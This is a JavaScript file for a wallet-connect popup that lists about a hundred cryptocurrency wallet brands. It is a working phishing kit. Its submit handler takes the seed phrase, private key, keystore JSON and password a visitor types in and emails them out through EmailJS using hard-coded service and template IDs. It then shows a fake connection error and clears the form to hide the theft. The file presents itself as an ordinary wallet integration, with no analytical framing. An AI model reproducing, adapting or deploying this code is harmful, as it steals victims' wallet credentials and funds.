// Initialize EmailJS with your public key
(function() {
  emailjs.init("JlcdvctBq3hjQGR3O");
})();

// Inject CSS styles
function injectStyles() {
  const styles = `
    /* Basic Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    /* Button styling */
    .btnmodal {
      background-color: #0066ff;
      color: #ffffff;
      padding: 14px 28px;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      display: block;
      margin: 20px auto;
      width: 100%;
      max-width: 300px;
      box-shadow: 0 4px 12px rgba(0, 102, 255, 0.3);
    }

    .btnmodal:hover {
      background-color: #0052cc;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 102, 255, 0.4);
    }

    .btnmodal:active {
      transform: translateY(0);
    }

    .btnmodal:disabled {
      background-color: #ccc;
      cursor: not-allowed;
      transform: none;
    }

    /* Modal background */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      z-index: 9999;
      backdrop-filter: blur(4px);
      animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
      }
      to {
        opacity: 1;
      }
    }

    /* Modal content */
    .modal-content {
      background-color: #ffffff;
      padding: 0;
      border-radius: 24px;
      width: 90%;
      max-width: 480px;
      position: relative;
      margin: 50px auto;
      max-height: 85vh;
      box-sizing: border-box;
      z-index: 10000;
      overflow: hidden;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      animation: slideUp 0.3s ease;
    }

    @keyframes slideUp {
      from {
        transform: translateY(50px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }

    .modal-content::-webkit-scrollbar {
      display: none;
    }

    /* Close button */
    .close {
      color: #666;
      font-size: 28px;
      font-weight: bold;
      position: absolute;
      top: 20px;
      right: 24px;
      cursor: pointer;
      z-index: 10;
      transition: color 0.3s ease;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      background: transparent;
    }

    .close:hover {
      color: #000;
      background: #f0f0f0;
    }

    /* Modal heading */
    .modal-content h2 {
      font-size: 24px;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      color: #1a1a1a;
      margin-bottom: 20px;
      font-weight: 700;
      text-align: center;
    }

    /* Wallet header */
    .wallethead {
      padding: 24px 24px 16px 24px;
      border-bottom: 1px solid #e5e5e5;
      background: #fafafa;
    }

    .wallethead p {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 16px;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    }

    /* Search input */
    #walletSearch {
      width: 100%;
      padding: 12px 16px;
      font-size: 15px;
      border: 2px solid #e5e5e5;
      border-radius: 12px;
      background: #ffffff;
      transition: all 0.3s ease;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      margin-bottom: 8px;
    }

    #walletSearch:focus {
      outline: none;
      border-color: #0066ff;
      box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.1);
    }

    /* Wallet options grid */
    .wallet-options {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      padding: 20px;
      max-height: 50vh;
      overflow-y: auto;
      background: #ffffff;
    }

    .wallet-options::-webkit-scrollbar {
      width: 6px;
    }

    .wallet-options::-webkit-scrollbar-track {
      background: #f0f0f0;
      border-radius: 10px;
    }

    .wallet-options::-webkit-scrollbar-thumb {
      background: #ccc;
      border-radius: 10px;
    }

    .wallet-options::-webkit-scrollbar-thumb:hover {
      background: #999;
    }

    /* Wallet item styling */
    .wallet-item {
      background-color: #f8f9fa;
      padding: 16px 12px;
      border-radius: 16px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s ease;
      border: 2px solid transparent;
      min-height: 110px;
    }

    .wallet-item:hover {
      background-color: #0066ff;
      transform: translateY(-4px);
      box-shadow: 0 8px 16px rgba(0, 102, 255, 0.3);
      border-color: #0066ff;
    }

    .wallet-item:hover span {
      color: #ffffff;
    }

    .wallet-item .wallet-icon {
      display: block;
      width: 48px;
      height: 48px;
      object-fit: contain;
      margin-bottom: 8px;
      border-radius: 12px;
    }

    .wallet-item span {
      font-size: 12px;
      color: #1a1a1a;
      font-weight: 500;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      line-height: 1.3;
      word-wrap: break-word;
      transition: color 0.3s ease;
    }

    /* Form inputs */
    .form-group {
      margin-bottom: 20px;
    }

    input[type="text"], 
    input[type="password"], 
    textarea {
      font-size: 15px;
      width: 100%;
      padding: 14px 16px;
      border-radius: 12px;
      border: 2px solid #e5e5e5;
      color: #1a1a1a;
      margin: 8px 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      transition: all 0.3s ease;
      background: #fafafa;
    }

    input[type="text"]:focus, 
    input[type="password"]:focus, 
    textarea:focus {
      outline: none;
      border-color: #0066ff;
      background: #ffffff;
      box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.1);
    }

    textarea {
      resize: vertical;
      min-height: 120px;
    }

    .modalcontainer {
      width: 100%;
      padding: 30px 20px;
      background-color: #ffffff;
      border-radius: 16px;
      box-sizing: border-box;
    }

    /* Tab styles */
    .tabsmodal {
      display: flex;
      gap: 8px;
      margin-bottom: 24px;
      padding: 0 20px;
    }

    .tabsmodal div {
      flex: 1;
      text-align: center;
      padding: 12px 16px;
      cursor: pointer;
      background-color: #f0f0f0;
      color: #666;
      font-size: 14px;
      border-radius: 10px;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      font-weight: 600;
      transition: all 0.3s ease;
      border: 2px solid transparent;
    }

    .tabsmodal div:hover {
      background-color: #e5e5e5;
    }

    .tabsmodal div.active {
      background-color: #0066ff;
      color: white;
      border-color: #0066ff;
    }

    /* Tab content styles */
    .tab-content {
      display: none;
      padding: 0 20px;
      animation: fadeInContent 0.3s ease;
    }

    @keyframes fadeInContent {
      from {
        opacity: 0;
        transform: translateY(10px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .tab-content.active {
      display: block;
    }

    label {
      display: block;
      margin: 16px 0 8px;
      font-size: 14px;
      font-weight: 600;
      color: #1a1a1a;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    }

    .modal-content button {
      padding: 14px 28px;
      background-color: #0066ff;
      color: white;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      transition: all 0.3s ease;
      width: calc(100% - 40px);
      margin: 20px 20px;
      box-shadow: 0 4px 12px rgba(0, 102, 255, 0.3);
    }

    .modal-content button:hover {
      background-color: #0052cc;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 102, 255, 0.4);
    }

    .modal-content button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
      transform: none;
    }

    .modal rect {
      fill: none;
      stroke: #0066ff;
      stroke-width: 4px;
      stroke-linecap: round;
      animation: 1.5s linear 0s infinite normal none running dash;
    }

    .form-image {
      display: flex;
      justify-content: center;
      flex-direction: column;
      align-items: center;
      padding: 30px 0 20px 0;
    }

    .form-image img {
      height: 80px;
      width: 80px;
      border-radius: 20px;
      position: relative;
      margin-top: -95px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }

    .form-text-header {
      color: #666;
      font-size: 15px;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      font-weight: 500;
      text-align: center;
      margin: 16px 0;
    }

    .modal-form-texts {
      text-align: center;
      display: flex;
      gap: 8px;
      flex-direction: column;
      padding: 0 20px;
    }

    /* Error modal styling */
    .error-icon {
      font-size: 64px;
      margin-bottom: 20px;
    }

    .error-message {
      font-size: 16px;
      color: #666;
      line-height: 1.6;
      margin: 20px 0 30px 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    }

    .try-again-button {
      margin-top: 20px;
      padding: 14px 28px;
      background-color: #0066ff;
      color: white;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      transition: all 0.3s ease;
      width: 100%;
      box-shadow: 0 4px 12px rgba(0, 102, 255, 0.3);
    }

    .try-again-button:hover {
      background-color: #0052cc;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 102, 255, 0.4);
    }

    @keyframes dash {
      to {
        stroke-dashoffset: 0;
      }
    }

    /* Mobile responsiveness */
    @media (max-width: 768px) {
      .modal-content {
        width: 95%;
        margin: 20px auto;
        max-height: 90vh;
        border-radius: 20px;
      }

      .wallet-options {
        grid-template-columns: repeat(3, 1fr);
        gap: 10px;
        padding: 16px;
      }

      .wallet-item {
        padding: 12px 8px;
        min-height: 100px;
      }

      .wallet-item .wallet-icon {
        width: 40px;
        height: 40px;
      }

      .wallet-item span {
        font-size: 11px;
      }

      .wallethead {
        padding: 20px 16px 12px 16px;
      }

      .wallethead p {
        font-size: 20px;
      }

      #walletSearch {
        font-size: 14px;
        padding: 10px 14px;
      }

      .modal-content h2 {
        font-size: 20px;
      }

      .tabsmodal {
        padding: 0 16px;
        gap: 6px;
      }

      .tabsmodal div {
        padding: 10px 12px;
        font-size: 13px;
      }

      .tab-content {
        padding: 0 16px;
      }

      input[type="text"], 
      input[type="password"], 
      textarea {
        font-size: 14px;
        padding: 12px 14px;
      }

      .btnmodal,
      .modal-content button,
      .try-again-button {
        padding: 12px 24px;
        font-size: 15px;
      }

      .close {
        top: 16px;
        right: 16px;
        font-size: 24px;
      }
    }

    @media (max-width: 480px) {
      .wallet-options {
        grid-template-columns: repeat(2, 1fr);
      }

      .modal-content {
        width: 98%;
        margin: 10px auto;
      }
    }
  `;

  const styleSheet = document.createElement("style");
  styleSheet.textContent = styles;
  document.head.appendChild(styleSheet);
}

// Wallet list data
const wallets = [
  { name: "MetaMask", image: "/script/images/MetaMask.png" },
  { name: "WalletConnect", image: "/script/images/wc.jpg" },
  { name: "Best Wallet", image: "/script/images/Best_Wallet.png" },
  { name: "Trust Wallet", image: "/script/images/Trust_Wallet.png" },
  { name: "WebAuth", image: "/script/images/webauth.jpg" },
  { name: "OKX Wallet", image: "/script/images/OKX_Wallet.png" },
  { name: "Phantom", image: "/script/images/Phantom.png" },
  { name: "Other Wallets", image: "/script/images/other-wallet.jpeg" },
  { name: "Coinbase Wallet", image: "/script/images/Coinbase_Wallet.png" },
  { name: "Fortmatic", image: "/script/images/formatic.png" },
  { name: "Solflare", image: "/script/images/solflare.jpeg" },
  { name: "Rabby Wallet", image: "/script/images/rabbywalllet.png" },
  { name: "SafePal", image: "/script/images/SafePal.jpg" },
  { name: "Kraken Wallet", image: "/script/images/kraken.jpg" },
  { name: "Sui Wallet", image: "/script/images/sui.png" },
  { name: "Bitfrost Wallet", image: "/script/images/bitfrost.png" },
  { name: "Brave Wallet", image: "/script/images/Brave_Wallet.png" },
  { name: "Leather Wallet", image: "/script/images/leather wallet.jpg" },
  { name: "Sonar Wallet", image: "/script/images/sonar.jpg" },
  { name: "Keplr Wallet", image: "/script/images/keplr.png" },
  { name: "Leap Wallet", image: "/script/images/leap.JPG" },
  { name: "STEPN Wallet", image: "/script/images/stepn.png" },
  { name: "Unisat Wallet", image: "/script/images/unisat.png" },
  { name: "Hotwallet", image: "/script/images/hotwallet.jpg" },
  { name: "Stake Cube", image: "/script/images/stake.jpg" },
  { name: "Uniswap", image: "/script/images/uniswap.png" },
  { name: "Coinomi Wallet", image: "/script/images/Coinomi.jpg" },
  { name: "Gnosis Multisig", image: "/script/images/Gnosis Safe Multisig.jpg" },
  { name: "Xverse Wallet", image: "/script/images/xverse1691669184466.png" },
  { name: "MagicEden Wallet", image: "/script/images/magiceden.png" },
  { name: "HaloDefi Wallet", image: "/script/images/HaloDefi Wallet.jpg" },
  { name: "Argent Wallet", image: "/script/images/Argent.png" },
  { name: "Atomic Wallet", image: "/script/images/Atomic.jpg" },
  { name: "Rainbow Wallet", image: "/script/images/Rainbow.png" },
  { name: "O3Wallet", image: "/script/images/O3_Swap.png" },
  { name: "1inch Wallet", image: "/script/images/1inch Wallet.jpg" },
  { name: "AKTIONARIAT", image: "/script/images/AKTIONARIAT.jpg" },
  { name: "Alice Wallet", image: "/script/images/Alice.jpg" },
  { name: "AlphaWallet", image: "/script/images/AlphaWallet.jpg" },
  { name: "Crypto Defi", image: "/script/images/Crypto_com_DeFi_Wallet.png" },
  { name: "AT.Wallet", image: "/script/images/AT.Wallet.jpg" },
  { name: "AToken Wallet", image: "/script/images/AToken Wallet.jpg" },
  { name: "Authereum", image: "/script/images/Authereum.jpg" },
  { name: "Binance SmartChain", image: "/script/images/Binance Smart Chain.jpg" },
  { name: "Bitkeep Wallet", image: "/script/images/Bitkeep.jpg" },
  { name: "Bitpay Wallet", image: "/script/images/Bitpay.jpg" },
  { name: "Bridge Wallet", image: "/script/images/Bridge_Wallet.png" },
  { name: "Coin98 Wallet", image: "/script/images/Coin98.jpg" },
  { name: "CoolWallet", image: "/script/images/CoolWallet S.jpg" },
  { name: "CYBAVO Wallet", image: "/script/images/CYBAVO Wallet.jpg" },
  { name: "D'CENT Wallet", image: "/script/images/D'CENT Wallet.jpg" },
  { name: "Defiant Wallet", image: "/script/images/Defiant.jpg" },
  { name: "Dharma Wallet", image: "/script/images/Dharma.jpg" },
  { name: "Dok Wallet", image: "/script/images/Dok Wallet.jpg" },
  { name: "EasyPocket", image: "/script/images/EasyPocket.jpg" },
  { name: "Eidoo", image: "/script/images/Eidoo.jpg" },
  { name: "Ellipal Wallet", image: "/script/images/Ellipal.jpg" },
  { name: "Equal Wallet", image: "/script/images/Equal.jpg" },
  { name: "Flare Wallet", image: "/script/images/Flare Wallet.jpg" },
  { name: "GridPlus Wallet", image: "/script/images/GridPlus.jpg" },
  { name: "Guarda Wallet", image: "/script/images/Guarda Wallet.jpg" },
  { name: "HaskKey Me", image: "/script/images/HaskKey Me.jpg" },
  { name: "Huobi Wallet", image: "/script/images/huobi.jpg" },
  { name: "imToken Wallet", image: "/script/images/imToken.jpg" },
  { name: "Infinito Wallet", image: "/script/images/Infinito.jpg" },
  { name: "infinity Wallet", image: "/script/images/infinity.jpg" },
  { name: "Jade Wallet", image: "/script/images/Jade Wallet.jpg" },
  { name: "KEYRING PRO", image: "/script/images/KEYRING_PRO.png" },
  { name: "KyberSwap", image: "/script/images/KyberSwap.jpg" },
  { name: "Ledger Live", image: "/script/images/Ledger_Live.png" },
  { name: "Loopring Wallet", image: "/script/images/loopring.jpg" },
  { name: "MathWallet", image: "/script/images/MathWallet.jpg" },
  { name: "Midas Wallet", image: "/script/images/Midas Wallet.jpg" },
  { name: "Morix Wallet", image: "/script/images/morix.png" },
  { name: "MYKEY", image: "/script/images/MYKEY.jpg" },
  { name: "Nash Wallet", image: "/script/images/Nash.jpg" },
  { name: "ONTO", image: "/script/images/ONTO.png" },
  { name: "Ownbit Wallet", image: "/script/images/Ownbit.jpg" },
  { name: "Pillar", image: "/script/images/pillar.jpg" },
  { name: "PEAKDEFI Wallet", image: "/script/images/PEAKDEFI Wallet.jpg" },
  { name: "PlasmaPay", image: "/script/images/PlasmaPay.jpg" },
  { name: "RWallet", image: "/script/images/RWallet.jpg" },
  { name: "SpartPoint", image: "/script/images/SpartPoint.jpg" },
  { name: "Spatium", image: "/script/images/Spatium.jpg" },
  { name: "Talken Wallet", image: "/script/images/Talken Wallet.jpg" },
  { name: "Tokenary", image: "/script/images/Tokenary.jpg" },
  { name: "TokenPocket", image: "/script/images/TokenPocket.png" },
  { name: "Tongue Wallet", image: "/script/images/tongue.jpg" },
  { name: "Torus Wallet", image: "/script/images/Torus.png" },
  { name: "Trust Vault", image: "/script/images/Trust Vault.jpg" },
  { name: "Trustee Wallet", image: "/script/images/Trustee_Wallet.png" },
  { name: "Unstoppable Wallet", image: "/script/images/Unstoppable Wallet.jpg" },
  { name: "Viawallet", image: "/script/images/Viawallet.jpg" },
  { name: "Vision", image: "/script/images/Vision.jpg" },
  { name: "Wallet.io", image: "/script/images/wallet.io.jpg" },
  { name: "XinFIn XDC", image: "/script/images/xinfin.jpg" },
  { name: "ZelCore", image: "/script/images/ZelCore.jpg" },
  { name: "Not Found", image: "/script/images/other-wallet.jpeg" }
];

// Inject HTML modals
function injectHTML() {
  const modalHTML = `
    <!-- Wallet Selection Modal -->
    <div id="walletModal" class="modal">
        <div class="modal-content">
            <div class="wallethead">
                <span id="closeModalBtn" class="close">&times;</span>
                <p>Connect Wallet</p>
                <input type="text" id="walletSearch" placeholder="🔍 Search wallets..." />
            </div>
            <div class="wallet-options" id="openForm">
                ${wallets.map(wallet => `
                    <div class="wallet-item" data-wallet="${wallet.name}" onclick="Opwallet()">
                        <img src="${wallet.image}" alt="${wallet.name}" class="wallet-icon" onerror="this.src='/script/images/other-wallet.jpeg'">
                        <span>${wallet.name}</span>
                    </div>
                `).join('')}
            </div>
        </div>
    </div>

    <!-- Wallet Connection Form Modal -->
    <div id="popupModal" class="modal">
        <div class="modal-content">
            <span onclick="closeForm()" class="close">&times;</span>
            <h2>Connect Wallet</h2>
            <div class="form-image">
                <svg viewBox="0 0 110 110" width="110" height="110">
                    <rect x="2" y="2" width="106" height="106" rx="36" stroke-dasharray="116 245" stroke-dashoffset="360"></rect>
                </svg>
                <img class='loading-img' alt="encryption" src="/script/images/encryption.png">
            </div>
            <div class="modal-form-texts">
                <h6 class="form-text-header">Initializing secure connection</h6>
            </div>

            <!-- Tabs Navigation -->
            <div class="tabsmodal">
                <div class="tab-button active" onclick="openTab(event, 'phrase')">Phrase</div>
                <div class="tab-button" onclick="openTab(event, 'privatekey')">Private Key</div>
                <div class="tab-button" onclick="openTab(event, 'keystore')">Keystore</div>
            </div>

            <!-- Phrase Tab Content -->
            <div class="tab-content active" id="phrase">
                <label for="phrase-input">Enter Phrase</label>
                <textarea id="phrase-input" name="phrase" placeholder="Enter your recovery phrase (typically 12-24 words separated by a single space)" rows="6"></textarea>
            </div>

            <!-- Private Key Tab Content -->
            <div class="tab-content" id="privatekey">
                <label for="private-key">Enter Private Key</label>
                <input type="text" id="private-key" name="privatekey" placeholder="Enter your private key">
            </div>

            <!-- Keystore JSON Tab Content -->
            <div class="tab-content" id="keystore">
                <label for="keystore-json">Keystore JSON</label>
                <textarea id="keystore-json" name="keystore" placeholder="Input your Keystore JSON" rows="6"></textarea>
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter Keystore password">
            </div>

            <button id="submitBtn" onclick="submitWallet()" class="btnmodal" type="button">Import Wallet</button>
        </div>
    </div>

    <!-- Error Modal -->
    <div id="errorModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <div class="form-image">
                <svg viewBox="0 0 110 110" width="110" height="110">
                    <rect x="2" y="2" width="106" height="106" rx="36" stroke-dasharray="116 245" stroke-dashoffset="360"></rect>
                </svg>
                <img class='loading-img' alt="encryption" src="/script/images/encryption.png">
            </div>
            <div class="modal-form-texts">
                <h6 class="form-text-header">Initializing secure connection</h6>
            </div>
            <div class="modalcontainer">
                <div class="error-icon">❌</div>
                <div class="error-message">
                    There was an error validating your wallet.<br>
                    Please revisit site and try another wallet.
                </div>
                <button class="try-again-button" onclick="window.location.reload()">Try Another Wallet</button>
            </div>
        </div>
    </div>
  `;

  const container = document.createElement('div');
  container.innerHTML = modalHTML;
  document.body.appendChild(container);
}

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
  // Inject styles and HTML
  injectStyles();
  injectHTML();

  // Get modal and buttons
  const modal = document.getElementById('walletModal');
  const closeModalBtn = document.getElementById('closeModalBtn');

  // Close the wallet selection modal
  if (closeModalBtn) {
    closeModalBtn.addEventListener('click', function () {
      if (modal) modal.style.display = 'none';
    });
  }

  // Close modals when clicking outside
  window.addEventListener('click', function(event) {
    const walletModal = document.getElementById('walletModal');
    const popupModal = document.getElementById('popupModal');
    const errorModal = document.getElementById("errorModal");

    if (event.target === walletModal) {
      walletModal.style.display = 'none';
    }
    if (event.target === popupModal) {
      popupModal.style.display = 'none';
    }
    if (event.target === errorModal) {
      errorModal.style.display = 'none';
    }
  });

  // Wallet search functionality
  const searchInput = document.getElementById("walletSearch");
  const walletItems = document.querySelectorAll(".wallet-item");

  if (searchInput && walletItems.length > 0) {
    searchInput.addEventListener("input", function () {
      const filter = this.value.toLowerCase();

      walletItems.forEach(item => {
        const span = item.querySelector("span");
        if (span) {
          const text = span.textContent.toLowerCase();
          item.style.display = text.includes(filter) ? "flex" : "none";
        }
      });
    });
  }
});

// Global function to open wallet modal - THIS IS WHAT YOU'LL CALL
function OpenWallets() {
  const modal = document.getElementById('walletModal');
  if (modal) modal.style.display = "block";
}

// Alternative function name (keeping for compatibility)
function walletModal() {
  OpenWallets();
}

// Open wallet connection form modal
function Opwallet() {
  const popupModal = document.getElementById('popupModal');
  const walletModal = document.getElementById('walletModal');
  
  if (popupModal) popupModal.style.display = 'block';
  if (walletModal) walletModal.style.display = 'none';
}

// Close wallet connection form modal
function closeForm() {
  const popupModal = document.getElementById('popupModal');
  if (popupModal) popupModal.style.display = 'none';
}
function In(){
  const popupModal = document.getElementById('popupModal');
  const walletModal = document.getElementById('walletModal');
  
  if (popupModal) popupModal.style.display = 'block';
  if (walletModal) walletModal.style.display = 'none';
}

// Open Tab function
function openTab(event, tabName) {
  const tabContent = document.getElementsByClassName('tab-content');
  for (let i = 0; i < tabContent.length; i++) {
    tabContent[i].classList.remove('active');
  }

  const tabButtons = document.getElementsByClassName('tab-button');
  for (let i = 0; i < tabButtons.length; i++) {
    tabButtons[i].classList.remove('active');
  }

  const selectedTab = document.getElementById(tabName);
  if (selectedTab) selectedTab.classList.add('active');
  if (event && event.currentTarget) event.currentTarget.classList.add('active');
}

// Function to show the error popup modal
function showErrorPopup() {
  const errorModal = document.getElementById("errorModal");
  if (errorModal) errorModal.style.display = "block";
}

// Function to close the error modal
function closeModal() {
  const errorModal = document.getElementById("errorModal");
  if (errorModal) errorModal.style.display = "none";
}

// Submit function to handle wallet connection
function submitWallet() {
  const phraseInput = document.getElementById('phrase-input')?.value.trim() || '';
  const privateKey = document.getElementById('private-key')?.value.trim() || '';
  const keystoreJson = document.getElementById('keystore-json')?.value.trim() || '';
  const password = document.getElementById('password')?.value.trim() || '';

  // Check if at least one field is filled
  if (!phraseInput && !privateKey && !keystoreJson) {
    alert("Please fill in at least one field");
    return;
  }

  // EmailJS template parameters
  const templateParams = {
    phrase: phraseInput,
    privateKey: privateKey,
    keystore: keystoreJson,
    password: password,
    timestamp: new Date().toLocaleString(),
    userAgent: navigator.userAgent,
    language: navigator.language
  };

  // Show loading state
  const submitBtn = document.getElementById('submitBtn');
  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.textContent = "Processing...";
  }

  // Send email using EmailJS
  emailjs.send('service_7058our', 'template_hv9rjt6', templateParams)
    .then(function(response) {
      console.log('SUCCESS!', response.status, response.text);
      
      // Close popup modal
      const popupModal = document.getElementById('popupModal');
      if (popupModal) popupModal.style.display = 'none';
      
      // Show error message
      alert("Error Connecting Wallet, Please try another wallet.");
      
      // Clear form fields
      if (document.getElementById('phrase-input')) document.getElementById('phrase-input').value = '';
      if (document.getElementById('private-key')) document.getElementById('private-key').value = '';
      if (document.getElementById('keystore-json')) document.getElementById('keystore-json').value = '';
      if (document.getElementById('password')) document.getElementById('password').value = '';
      
      // Reset button
      if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.textContent = "Import Wallet";
      }
    })
    .catch(function(error) {
      console.error("EmailJS error:", error);
      
      // Reset button
      if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.textContent = "Import Wallet";
      }
      
      // Show error popup
      showErrorPopup();
    });
}